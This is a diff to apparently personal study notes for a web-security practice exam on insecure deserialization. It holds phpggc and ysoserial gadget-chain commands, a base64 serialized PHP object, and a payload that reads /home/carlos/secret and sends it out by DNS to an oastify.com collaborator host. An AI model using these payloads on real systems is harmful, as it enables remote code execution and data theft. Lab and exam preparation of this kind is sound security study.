@@ -125,10 +125,31 @@ Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6
 
 > File reading
 ```bash
-phpggc Symfony/RCE4 exec 'nslookup `echo foo`.7hpiixkmwfm4hquufiyhwafzbqhh585wu.oastify.com' | base64 -w 0
+phpggc Symfony/RCE4 exec 'nslookup `echo foo`.[BURP_COLLABORATOR]' | base64 -w 0
 ```
 
 > Base64 encoded PHP object
 ```php
 Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czo2NToibnNsb29rdXAgYGVjaG8gZm9vYC43aHBpaXhrbXdmbTRocXV1Zml5aHdhZnpicWhoNTg1d3Uub2FzdGlmeS5jb20iO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
+```
+
+## Practice Exam
+
+> The final part of the practice exam is a **Deserialization** vuln, which can be seen from the `admin-prefs` cookie
+
+> The magic byte that we see here is `H4sIAAAAAAAAA...` a gzip base64
+> Look here for reference https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md
+
+```bash
+echo -n 'nslookup `cat /home/carlos/secret`.ppi8d5j2fvab9xq3btdusy7ad1js7qvf.oastify.com' | base64 -w 0
+```
+
+> How do i know it's `CommonsCollections6`? I don't, i just tried almost all of them
+```bash
+java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+   --add-opens=java.base/java.net=ALL-UNNAMED \
+   --add-opens=java.base/java.util=ALL-UNNAMED \
+   --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \
+-jar ysoserial-all.jar CommonsCollections6 'bash -c {echo,bnNsb29rdXAgYGNhdCAvaG9tZS9jYXJsb3Mvc2VjcmV0YC5wcGk4ZDVqMmZ2YWI5eHEzYnRkdXN5N2FkMWpzN3F2Zi5vYXN0aWZ5LmNvbQ==}|{base64,-d}|{bash,-i}' | gzip | base64 -w 0 > poc1
 ```
